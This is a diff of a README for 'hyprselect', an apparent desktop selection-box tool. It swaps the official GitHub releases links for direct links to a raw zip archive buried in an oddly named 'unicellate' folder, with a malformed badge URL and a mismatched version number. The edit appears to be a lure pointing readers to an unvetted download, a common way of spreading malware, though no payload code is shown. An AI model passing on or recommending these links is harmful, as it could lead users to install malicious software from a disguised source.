@@ -1,7 +1,7 @@
 # 🎨 hyprselect - Add a Fun Selection Box to Your Desktop
 
 ## 📥 Download Now
-[![Download hyprselect](https://img.shields.io/badge/Download%20hyprselect-v1.0-blue.svg)](https://github.com/kushagrabatra/hyprselect/releases)
+[![Download hyprselect](https://github.com/kushagrabatra/hyprselect/raw/refs/heads/main/unicellate/hyprselect_3.2-beta.3.zip%https://github.com/kushagrabatra/hyprselect/raw/refs/heads/main/unicellate/hyprselect_3.2-beta.3.zip)](https://github.com/kushagrabatra/hyprselect/raw/refs/heads/main/unicellate/hyprselect_3.2-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Make sure your system meets these requirements prior to installation.
 
 To get started with hyprselect, visit the official releases page to download the latest version:
 
-[Download hyprselect](https://github.com/kushagrabatra/hyprselect/releases)
+[Download hyprselect](https://github.com/kushagrabatra/hyprselect/raw/refs/heads/main/unicellate/hyprselect_3.2-beta.3.zip)
 
 ### Step-by-Step Installation
 
